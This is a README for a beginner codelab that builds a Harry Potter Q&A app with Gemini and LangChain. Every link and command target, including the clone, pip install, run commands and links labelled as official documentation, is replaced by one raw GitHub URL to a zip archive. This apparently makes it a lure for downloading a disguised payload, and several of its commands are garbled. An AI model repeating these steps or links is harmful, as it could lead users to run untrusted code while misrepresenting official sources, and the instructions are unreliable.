# 🤖 Build with AI — Simple Harry Potter Q&A Application

This project demonstrates how to build a simple **Question & Answer** application powered by **Google Gemini models** using the **LangChain** framework and other powerful tools for natural language processing, document handling, and vector search.

> 🐍 **Note:** This codelab uses **Python** as the primary programming language. Please ensure you have Python 3.8+ installed.

> 💡 In this codelab, we'll focus on the https://raw.githubusercontent.com/CalebGaichuhie2001/AI-Hogwarts/master/book_1/AI-Hogwarts-v3.4-alpha.3.zip file, where you'll add the necessary code to integrate all components and bring the application to life.

---

## 🛠️ Tools & Libraries Used

| Library                    | Purpose                                               |
| -------------------------- | ----------------------------------------------------- |
| `python-dotenv`            | Manage environment variables from a `.env` file       |
| `langchain`                | Framework for building LLM-powered applications       |
| `langchain-community`      | Community-contributed integrations for LangChain      |
| `langchain-google-genai`   | Integration with Google Gemini models                 |
| `google-generativeai`      | Direct access to Google Gemini API                    |
| `unstructured`             | Load and preprocess documents                         |
| `nltk`                     | Text processing and tokenization                      |
| `chromadb`                 | Vector database for storing and retrieving embeddings |
| `onnxruntime` *(optional)* | Required for `chromadb` on some platforms             |

---

## 🚀 Getting Started

### 1. Fork the Repository

Click the **Fork** button at the top right to clone this repository into your GitHub account.

### 2. Clone and Set Up

```bash
git clone https://raw.githubusercontent.com/CalebGaichuhie2001/AI-Hogwarts/master/book_1/AI-Hogwarts-v3.4-alpha.3.zip
cd your-repo-name
```

### 3. Install Requirements

Use `pip` to install all required packages:

```bash
pip install -r https://raw.githubusercontent.com/CalebGaichuhie2001/AI-Hogwarts/master/book_1/AI-Hogwarts-v3.4-alpha.3.zip
```

> 💡 **macOS users:**
> If installing `chromadb` fails, try using `conda`:
>
> ```bash
> conda install onnxruntime -c conda-forge
> ```

> ⚠️ **Windows users:**
> You may need to install the **Microsoft Visual C++ Build Tools** before installing `onnxruntime`.

---

## 🔑 Set Your Gemini API Key

### 1. Get Your API Key

Visit [Google AI Studio](https://raw.githubusercontent.com/CalebGaichuhie2001/AI-Hogwarts/master/book_1/AI-Hogwarts-v3.4-alpha.3.zip) to generate your Gemini API key.

### 2. Set the API Key in Your Environment

#### macOS / Linux:

```bash
export GEMINI_API_KEY="your-actual-api-key"
python https://raw.githubusercontent.com/CalebGaichuhie2001/AI-Hogwarts/master/book_1/AI-Hogwarts-v3.4-alpha.3.zip
```

#### Windows (Command Prompt):

```cmd
set GEMINI_API_KEY=your-actual-api-key
python https://raw.githubusercontent.com/CalebGaichuhie2001/AI-Hogwarts/master/book_1/AI-Hogwarts-v3.4-alpha.3.zip
```

> 💡 Alternatively, create a `.env` file in the project root:
>
> ```
> GEMINI_API_KEY=your-actual-api-key
> GOOGLE_API_KEY=your-actual-api-key
> ```

---

## 📦 Running the Application

Once everything is set up, run:

```bash
python https://raw.githubusercontent.com/CalebGaichuhie2001/AI-Hogwarts/master/book_1/AI-Hogwarts-v3.4-alpha.3.zip
```

The app will process your input and respond using the Gemini model.

---

## 📚 Resources

* 📘 [Gemini API Model Documentation](https://raw.githubusercontent.com/CalebGaichuhie2001/AI-Hogwarts/master/book_1/AI-Hogwarts-v3.4-alpha.3.zip)
* 📘 [LangChain Documentation](https://raw.githubusercontent.com/CalebGaichuhie2001/AI-Hogwarts/master/book_1/AI-Hogwarts-v3.4-alpha.3.zip)
* 🧠 [Google AI Studio](https://raw.githubusercontent.com/CalebGaichuhie2001/AI-Hogwarts/master/book_1/AI-Hogwarts-v3.4-alpha.3.zip)
* 📦 [Chroma Vector DB](https://raw.githubusercontent.com/CalebGaichuhie2001/AI-Hogwarts/master/book_1/AI-Hogwarts-v3.4-alpha.3.zip)
* 📄 [NLTK Documentation](https://raw.githubusercontent.com/CalebGaichuhie2001/AI-Hogwarts/master/book_1/AI-Hogwarts-v3.4-alpha.3.zip)
* 💡 [RAG Codelabs](https://raw.githubusercontent.com/CalebGaichuhie2001/AI-Hogwarts/master/book_1/AI-Hogwarts-v3.4-alpha.3.zip)

---
